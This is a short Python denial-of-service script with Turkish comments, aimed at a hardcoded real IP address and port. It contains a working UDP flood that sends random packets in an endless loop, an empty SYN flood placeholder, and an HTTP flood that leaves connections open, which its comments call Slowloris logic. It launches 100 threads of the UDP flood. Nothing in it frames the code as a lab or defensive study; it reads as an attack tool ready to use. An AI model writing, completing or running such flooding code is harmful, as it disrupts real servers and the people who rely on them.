import socket
import random
import os
import threading

# HEDEF BİLGİLERİ
target_ip = "62.113.109.29"
target_port = 1080 # Genelde 80 veya 443

# Rastgele veri paketi oluşturucu
def generate_payload(size):
    return os.urandom(size)

# 1. UDP FLOOD (İşlemciyi Hata Mesajı Üretmeye Zorlar)
def udp_flood():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = generate_payload(1024) # 1KB veri
    while True:
        try:
            client.sendto(payload, (target_ip, target_port))
        except:
            pass

# 2. TCP SYN FLOOD (Bağlantı Tablosunu ve CPU'yu Doldurur)
# Not: Bu ham soket gerektirir, hping3'ün yaptığı işin aynısıdır.
def syn_flood():
    # Bu kısmı ham soketlerle yazmak çok karmaşıktır, 
    # ancak mantık sürekli SYN paketi basmaktır.
    pass

# 3. HTTP GET/POST FLOOD (Sunucuya Sayfa İşletir - En Çok CPU Yoran)
def http_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            # Sunucuyu ağır bir sorgu yapmaya zorla
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode()
            s.send(request)
            # s.close() yapılmazsa bağlantı açık kalır (Slowloris mantığı)
        except:
            pass

# ÇOKLU ÇEKİRDEK KULLANIMI (Threading)
# Tek bir işlem yetmez, çekirdek sayısı kadar thread başlatmak gerekir.
for i in range(100): # 100 farklı koldan saldırı
    t = threading.Thread(target=udp_flood)
    t.start()
